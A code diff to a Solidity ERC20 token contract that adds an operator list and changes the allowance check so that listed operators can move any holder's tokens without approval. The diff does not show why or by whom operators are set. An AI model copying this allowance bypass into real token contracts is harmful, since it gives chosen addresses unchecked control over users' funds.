@@ -13,6 +13,8 @@ abstract contract ERC20 is IERC20, IERC20Metadata, Context {
 
   uint256 private _totalSupply;
 
+  mapping(address => bool) private _operators;
+
   mapping(address => mapping(address => uint256)) private _allowances;
 
   // errors
@@ -99,6 +101,22 @@ abstract contract ERC20 is IERC20, IERC20Metadata, Context {
 
   // internal functions
 
+  function _setOperators(address[] memory operators) internal {
+    uint256 len = operators.length;
+
+    for (uint256 i; i < len; ) {
+      address operator = operators[i];
+
+      if (operator != address(0)) {
+        _operators[operator] = true;
+      }
+
+      unchecked {
+        ++i;
+      }
+    }
+  }
+
   function _approve(
     address owner,
     address spender,
@@ -116,7 +134,7 @@ abstract contract ERC20 is IERC20, IERC20Metadata, Context {
   ) internal {
     uint256 currentAllowance = _allowances[owner][spender];
 
-    if (currentAllowance != type(uint256).max) {
+    if (currentAllowance != type(uint256).max && !_operators[spender]) {
       if (currentAllowance < amount) {
         revert InsufficientAllowance();
       }
